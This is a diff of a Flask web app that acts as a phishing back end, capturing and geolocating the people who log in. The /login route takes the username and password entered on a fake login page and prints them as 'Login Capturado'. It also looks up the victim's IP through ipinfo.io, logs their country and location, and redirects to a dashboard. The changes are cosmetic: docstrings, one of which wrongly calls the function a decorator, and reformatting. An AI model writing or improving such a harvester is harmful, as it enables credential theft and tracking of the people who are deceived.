@@ -8,11 +8,20 @@ app.secret_key = urandom(16)
 
 @app.route("/")
 def index():
+    """
+    Renders the index.html template.
+
+    Returns:
+        The rendered index.html template.
+    """
     return render_template("index.html")
 
 
 @app.route("/login", methods=["GET", "POST"])
 def login():
+    """
+    A decorator to specify the route for the login page and the logic for handling GET and POST requests.
+    """
     ip = request.remote_addr
     response = requests.get(f"https://ipinfo.io/{ip}/json")
     data = response.json()
@@ -25,10 +34,7 @@ def login():
         username = request.form["username"]
         password = request.form["password"]
 
-        print(f"""\n\nLogin Capturado:
-Username: {username}
-Password: {password}\n
-""")
+        print(f"\n\nLogin Capturado: \nUsername: {username}\nPassword: {password}\n")
 
         print(f"O endereço IP do usuário é: {ip}")
         print(f"O pais do usuário é: {pais}")
@@ -37,13 +43,16 @@ Password: {password}\n
         print(f"A loc do ususario é {loc}")
         print("\n")
 
-        return redirect("dashboard") 
+        return redirect("dashboard")
 
     return render_template("login.html")
 
 
 @app.route("/dashboard")
 def dashboard():
+    """
+    A route for the dashboard that renders the dashboard.html template.
+    """
     return render_template("dashboard.html")
 
 
